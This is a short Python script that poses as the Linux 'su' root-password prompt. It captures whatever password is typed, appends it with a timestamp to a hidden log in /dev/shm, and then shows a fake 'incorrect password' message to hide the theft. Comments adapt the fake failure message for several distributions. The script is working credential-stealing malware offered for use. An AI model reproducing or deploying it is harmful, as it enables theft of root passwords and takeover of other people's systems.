#!/usr/bin/python
# coding=utf-8
import os
import sys
import getpass
import time

current_time = time.strftime("%Y-%m-%d %H:%M")
logfile = "/dev/shm/.su.log"

# CentOS
#fail_str = "su: incorrect password"
# Ubuntu
#fail_str = "su: Authentication failure"
# For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样
fail_str = "su:incorrent password"
try:
    passwd = getpass.getpass(prompt='Password:')
    file = open(logfile, 'a')
    file.write("[%s]t%s" % (passwd, current_time))
    file.write('n')
    file.close()
except:
    pass
time.sleep(1)
print fail_str
